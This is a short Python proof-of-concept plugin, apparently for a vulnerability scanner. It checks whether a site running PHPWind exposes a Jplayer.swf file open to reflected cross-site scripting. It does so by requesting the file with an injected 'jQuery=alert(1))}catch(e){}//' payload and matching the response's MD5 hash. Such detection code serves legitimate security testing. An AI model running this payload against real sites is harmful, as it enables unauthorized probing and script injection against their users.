#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : PHPWind Jplayer.swf Flash XSS
From : http://wooyun.org/bugs/wooyun-2013-017733
References : http://www.beebeeto.com/pdb/poc-2014-0201/
"""
import md5


def assign(service, arg):
    if service == "phpwind":
        return True, arg


def audit(arg):
    flash_md5 = "769d053b03973d380da80be5a91c59c2"
    payload = "/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=alert(1))}catch(e){}//"
    target_url = arg + payload
    code, head, res, errcode, _ = curl.curl(target_url)
    md5_value = md5.new(res).hexdigest()
    if md5_value in flash_md5:
        security_info(target_url + 'phpwind Reflected XSS')

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('phpwind', 'http://www.example.com/')[1])